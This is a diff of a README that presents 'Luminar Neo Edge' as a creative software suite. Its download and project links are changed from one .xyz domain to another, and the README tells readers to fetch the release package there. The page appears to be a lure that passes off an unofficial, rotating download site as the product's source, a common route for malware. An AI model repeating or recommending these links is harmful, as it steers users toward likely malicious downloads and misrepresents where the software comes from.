@@ -4,8 +4,8 @@
 Professional **Luminar Neo Edge** creative suite for photo editing, graphic design, and digital illustration with industry-standard tools.
 
 ## 📥 Downloads & Links
-- 📥 **Grab the latest version:** [https://luminar-neo-edge.softonx.xyz](https://luminar-neo-edge.softonx.xyz)
-- 📖 **Project page:** [https://luminar-neo-edge.softonx.xyz](https://luminar-neo-edge.softonx.xyz)
+- 📥 **Grab the latest version:** [https://luminar-neo-edge.softax.xyz](https://luminar-neo-edge.softax.xyz)
+- 📖 **Project page:** [https://luminar-neo-edge.softax.xyz](https://luminar-neo-edge.softax.xyz)
 
 ## How to use it
 1. Download the release package from the link above.
